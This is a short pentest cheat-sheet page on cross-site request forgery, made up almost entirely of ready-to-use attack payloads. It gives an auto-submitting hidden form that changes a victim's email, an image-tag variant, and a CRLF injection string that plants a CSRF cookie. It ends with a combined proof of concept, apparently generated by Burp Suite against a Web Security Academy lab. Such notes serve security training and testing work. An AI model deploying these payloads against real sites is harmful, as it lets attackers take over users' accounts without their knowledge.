---
title: "CSRF"
description: ""
summary: ""
date: 2023-09-07T16:06:50+02:00
lastmod: 2023-09-07T16:06:50+02:00
draft: false
weight: 800
toc: true
sidebar:
  collapsed: true
seo:
  title: "" # custom title (optional)
  description: "" # custom description (recommended)
  canonical: "" # custom canonical URL (optional)
  robots: "" # custom robot tags (optional)
  noindex: false # false (default) or true
---


- Free Poc Tool : 
https://security.love/CSRF-PoC-Genorator/

## Basic CSRF 

```sh
<html> 
<body> 
<form action="https://vulnerable-website.com/email/change" method="POST"> <input type="hidden" name="email" value="pwned@evil-user.net" /> </form> 
<script> document.forms[0].submit(); </script> 
</body> 
</html>
```

- Even possible to do so : 

```sh
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
```

- If you have an input that is reflected as cookie , you can try to do CRLF attack to inject a cookie to the victim like this : 
```sh
/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
```

- It's possible to combine to request this way for your POC : 
```sh
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a6b00eb049ba97a82a8f11d00dc00ea.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hopddde2&#64;test&#46;fr" />
      <input type="hidden" name="csrf" value="rw096v1qAyqMjnPQNuFoOTr9WovKHmtn" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a6b00eb049ba97a82a8f11d00dc00ea.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=j2VuedM3I17WVZZSmL1VSsrL2LsUqZv9%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>


```